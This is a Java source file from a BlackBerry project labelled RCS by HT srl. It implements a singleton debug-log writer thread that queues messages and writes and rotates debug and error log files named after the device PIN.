//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.utils
 * File         : DebugWriter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.debug;

import blackberry.Device;
import blackberry.Singleton;
import blackberry.config.Cfg;
import blackberry.fs.AutoFile;
import blackberry.fs.Path;
import blackberry.interfaces.iSingleton;
import blackberry.utils.DateTime;

/**
 * The Class DebugWriter.
 */
public final class DebugWriter extends Thread implements iSingleton {

    static final String DEBUG_NAME = "D_";
    static final String ERROR_NAME = "E_";

    // static final String SD_PATH = Path.SD() + Path.DEBUG_DIR + FILE_NAME
    //         + Device.getPin() + ".txt";
    // static final String FLASH_PATH = Path.USER() + Path.DEBUG_DIR + FILE_NAME
    //         + Device.getPin() + ".txt";
    private static final long SLEEP_TIME = 1000;

    private static AutoFile fileDebug;
    private static AutoFile fileDebugErrors;

    private static final int MAX_NUM_MESSAGES = 5000;
    int numMessages;

    boolean toStop;
    boolean logToFile = false;
    boolean logToEvents = false;

    DebugQueue queue;
    private boolean started;

    //#ifdef EVENTLOGGER
    public static long loggerEventId = 0x98f417b7dbfd6ae4L;

    //#endif

    /**
     * Instantiates a new debug writer.
     * 
     * @param logToSD
     *            the log to sd
     */
    private DebugWriter() {
        toStop = false;
        queue = new DebugQueue();
    }

    static DebugWriter instance;
    static final long GUID = 0xbc56afac435c4a92L;

    public static synchronized DebugWriter getInstance() {

        if (instance == null) {
            instance = (DebugWriter) Singleton.self().get(GUID);
            if (instance == null) {

                final DebugWriter singleton = new DebugWriter();

                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    private void createNewFile(boolean first) {

        if (!logToFile) {
            return;
        }

        Path.createDirectory(Path.debug(), false);
        fileDebug = new AutoFile(Path.debug(), debugName(DEBUG_NAME));
        fileDebugErrors = new AutoFile(Path.debug(), debugName(ERROR_NAME));

        // log rotate
        if (fileDebug.exists()) {
            fileDebug.rotateLogs("D_");
        }

        fileDebug.create();
        if (first) {
            DateTime now = new DateTime();
            fileDebug.append("--- DEBUG " + now.getOrderedString() + " - "
                    + now + " ---\r\n");
            fileDebug.append("--- BUILD " + Cfg.BUILD_ID + " --- "
                    + Cfg.BUILD_TIMESTAMP + "\r\n");
        }

        // crea il log degli errori solo se non esiste, non si ruota
        if (!fileDebugErrors.exists()) {
            fileDebugErrors.create();
        }

        //#ifdef DBC
        Check.ensures(fileDebug != null, "null filedebug");
        Check.ensures(fileDebugErrors != null, "null filedebugerrors");
        //#endif

    }

    private String debugName(String debugName) {
        return debugName + Device.getPin() + ".txt";
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Thread#run()
     */
    public void run() {
        started = true;
        
        //#ifdef DEBUG
        if (logToFile) {
            createNewFile(true);
        }
        //#endif

        for (;;) {
            //System.out.println("DebugWriter.run"); 
            //synchronized (this) {
            LogLine logLine = queue.dequeue();
            String message = logLine.message;
            int level = logLine.level;
            boolean error = logLine.error;

            if (logToFile) {
                if (message.length() > 0) {
                    if (!fileDebug.exists()) {
                        fileDebug.create();
                    }
                    boolean ret = fileDebug.append(message + "\r\n");
                }

                // elabora l'errore
                if (error) {
                    if (!fileDebugErrors.exists()) {
                        fileDebugErrors.create();
                    }
                    boolean ret = fileDebugErrors.append(message + "\r\n");
                }

                if (numMessages > MAX_NUM_MESSAGES) {
                    numMessages = 0;
                    fileDebug.rotateLogs("D_");
                    createNewFile(false);
                } else {
                    numMessages += 1;
                }
            }

            if (toStop) {
                break;
            }

        }

    }

    //Utils.sleep((int) SLEEP_TIME);
    //}

    /**
     * Stop.
     */
    public synchronized void requestStop() {
        toStop = true;
        queue.close();

        //notifyAll();
    }

    public synchronized boolean append(String message, int priority,
            boolean error) {
        //#ifdef DBC
        Check.requires(queue != null, "append: queue==null");
        //#endif
        return queue.enqueue(message, priority, error);
    }

    public boolean started() {
        return started;
    }

}
